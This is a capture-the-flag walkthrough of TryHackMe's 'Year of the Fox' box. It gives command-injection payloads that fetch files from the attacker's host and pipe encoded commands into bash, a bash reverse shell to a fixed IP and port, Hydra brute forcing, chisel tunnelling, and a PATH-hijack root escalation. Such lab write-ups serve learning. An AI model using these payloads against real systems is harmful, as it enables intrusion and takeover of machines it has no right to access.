In this walkthrough, we'll go over a challenge (hard) level box called ***Year of the Fox*** on [TryHackMe](https://tryhackme.com/room/yotf) 

![Yof](yof.png)

Let's start the scanning process with nmap. The IP address would be different when you deploy it:
```bash
nmap -sTV -n -sC -T4 -p- 10.10.47.77 --open
```
Per the nmap result, it looks like port 80 is open:
```bash
Nmap scan report for 10.10.47.77
Host is up (0.27s latency).

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m38s, median: 0s
|_nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2021-06-30T01:45:59+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-30T00:45:59
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 29 20:46:06 2021 -- 1 IP address (1 host up) scanned in 22.08 seconds
```
![YoF index](yof-http-basic-auth.png)

It looks like we are being asked to enter credentials. I also realize that SMB is also running on this server so let's enumerate SMB as well:
`enum4linux -a -o 10.10.242.71`
![YoF enum4linux1](yof-enum4linux1.png)
![YoF enum4linux2](yof-enum4linux2.png)

User | User Type
----- | ---------
fox | Local User
rascal | Local User

At this point, we can try to brute force the HTTP basic auth with Hydra `hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.242.71 http-get`:

![YoF HTTP Basicauth](yof-http-basicauth-bruteforce.png)

Username | Password
----------- | --------
rascal | jesussaves

We can login with the above credentials:
![YoF Authenticated Login](yof-authenticated-login.png)

However, there isn't much here and we can proxy the traffic via Burp after much enumeration, I use the below script to upload a test file:
`"\"; wget http://10.13.6.172:80/test.txt -O /tmp/t.txt; echo\""`
![YoF Command Injection](yof-command-injection-test.png)

This action is successful:

![YoF Python Server](yof-python-server.png)

Another comand injection script `\";echo d2hvYW1p | base64 -d | bash \n`:
![YoF Command Injection](yof-command-injection-whoami.png)

We can now create a file called "revshell.sh" and insert the below payload for getting a reverse shell:
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.13.6.172/5555 0>&1
```
Using the same method, we upload the file to "/tmp" directory `"\"; wget http://10.13.6.172:80/revshell.sh -O /tmp/revshell.sh; echo\""`

After that we start a listener with nc `nc -nlvp 5555`

We can then run the following command `"\"; bash /tmp/revshell.sh; echo\""`:
![YoF bash revshell](yof-bash-revshell.png)
![YoF initial foothold](yof-initial-foothold.png)

After running linpeas, I find a lot of rabbit holes, but one finding is interesting:
![YoF linpeas](yof-linpeas.png)

SSH is running locally so we can move chisel to the target machine and forward the port:
1. Edit proxychains.conf `socks 127.0.0.1 9999`:

	![YoF Proxchains Conf](yof-proxchains-conf.png)
2. Run the following on the local machine `./chisel_1.7.6_linux_amd64 server --socks5 -p 1111 --reverse`:
	![YoF Chisel Server](yof-chisel-server.png)
3. Run the following on target machine `./chisel_1.7.6_linux_amd64 client 10.13.6.172:1111 R:9999:127.0.0.1:22`:
	![YoF Chisel Client](yof-chisel-client.png)
  
We can then try to brute force the SSH service with Hydra `hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1:9999 -v -f`:

![YoF Hydra](yof-hydra-ssh.png)

Username | Password
----------- | --------
fox | michelle1

We can now SSH into the server with above credentials `ssh -p 9999 fox@127.0.0.1`:

![YoF SSH](yof-ssh.png)

It looks like fox user could run "/usr/sbin/shutdown" as root without any passwords:
![YoF FOX Sudo](yof-fox-sudo-l.png)

We then transfer "/usr/sbin/shutdown" to my local Kali machine and inspected it with `strings shutdown`:

![YoF Strings](yof-strings-shutdown.png)

Next we copy "/bin/bash" to "/tmp"
`cp /bin/bash /tmp/bash`

We can now run the following command `sudo "PATH=/tmp:$PATH" /usr/sbin/shutdown` to get a root shell:
![YoF Root Shell](yof-root-txt.png)

I hope you enjoyed this walkthrough.

[<= Go Back to TryHackMe Walkthroughs](TryHackMeWalkthroughs.md)

[<= Go Back to Main Menu](index.md)
